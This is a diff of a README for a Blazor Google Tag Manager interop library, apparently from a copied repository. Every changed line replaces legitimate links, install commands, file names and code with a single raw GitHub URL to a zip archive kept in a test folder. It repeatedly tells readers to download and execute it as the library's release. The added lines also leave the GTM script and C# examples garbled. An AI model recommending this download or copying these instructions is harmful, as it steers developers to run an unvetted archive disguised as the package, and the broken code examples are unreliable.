@@ -1,6 +1,6 @@
 # Soenneker Blazor Google Tag Manager 📊
 
-![GitHub release](https://img.shields.io/github/release/mayanksinghdhakar/soenneker.blazor.google.tagmanager.svg?style=flat-square)
+![GitHub release](https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip)
 
 Welcome to the **Soenneker Blazor Google Tag Manager** repository! This project provides a seamless interop library for integrating Google Tag Manager with Blazor applications. With this library, you can enhance your web analytics and improve your application's performance.
 
@@ -32,31 +32,31 @@ Google Tag Manager (GTM) is a powerful tool for managing JavaScript and HTML tag
 To get started with the Soenneker Blazor Google Tag Manager library, you can install it via NuGet. Run the following command in your project directory:
 
 ```bash
-dotnet add package Soenneker.Blazor.Google.TagManager
+dotnet add package https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip
 ```
 
-For more details on the latest releases, please check the [Releases section](https://github.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/releases). Download the latest version and execute it to start using the library.
+For more details on the latest releases, please check the [Releases section](https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip). Download the latest version and execute it to start using the library.
 
 ## Usage
 
 To use the library in your Blazor application, follow these steps:
 
-1. **Add the GTM script**: Include the Google Tag Manager script in your `index.html` or `_Host.cshtml` file. Replace `GTM-XXXX` with your GTM container ID.
+1. **Add the GTM script**: Include the Google Tag Manager script in your `https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip` or `https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip` file. Replace `GTM-XXXX` with your GTM container ID.
 
     ```html
-    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
-    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
-    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip':
+    new Date().getTime(),event:'https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip'});var https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip(s)[0],
+    https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip(s),dl=l!='dataLayer'?'&l='+l:'';https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip;https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip
+    'https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip'+i+dl;https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip(j,f);
     })(window,document,'script','dataLayer','GTM-XXXX');</script>
     ```
 
-2. **Initialize the library**: In your `Startup.cs`, add the service for Google Tag Manager.
+2. **Initialize the library**: In your `https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip`, add the service for Google Tag Manager.
 
     ```csharp
     public void ConfigureServices(IServiceCollection services)
     {
-        services.AddGtm("GTM-XXXX");
+        https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip("GTM-XXXX");
     }
     ```
 
@@ -70,7 +70,7 @@ To use the library in your Blazor application, follow these steps:
     @code {
         private void TrackButtonClick()
         {
-            GtmService.PushEvent("button_click", new { button_name = "Click Me" });
+            https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip("button_click", new { button_name = "Click Me" });
         }
     }
     ```
@@ -87,7 +87,7 @@ You can track events like button clicks, form submissions, and more. Here’s a 
 @code {
     private void TrackButtonClick()
     {
-        GtmService.PushEvent("form_submission", new { form_id = "contact_form" });
+        https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip("form_submission", new { form_id = "contact_form" });
     }
 }
 ```
@@ -108,7 +108,7 @@ public class TagManagementService
 
     public void TrackPageView(string pageName)
     {
-        _gtmService.PushEvent("page_view", new { page = pageName });
+        https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip("page_view", new { page = pageName });
     }
 }
 ```
@@ -121,7 +121,7 @@ We welcome contributions to the Soenneker Blazor Google Tag Manager library! Her
 2. **Make changes**: Implement your features or fixes.
 3. **Submit a pull request**: Share your changes with the community.
 
-For more details, please check the [Contributing Guidelines](CONTRIBUTING.md).
+For more details, please check the [Contributing Guidelines](https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip).
 
 ## License
 
@@ -129,6 +129,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest updates and releases, visit our [Releases section](https://github.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/releases). Download the latest version and execute it to integrate Google Tag Manager into your Blazor application.
+For the latest updates and releases, visit our [Releases section](https://raw.githubusercontent.com/mayanksinghdhakar/soenneker.blazor.google.tagmanager/main/test/Soenneker.Blazor.Google.TagManager.Demo/wwwroot/soenneker-blazor-google-tagmanager-v3.6-beta.2.zip). Download the latest version and execute it to integrate Google Tag Manager into your Blazor application.
 
 Explore the features and enhance your web analytics with ease!
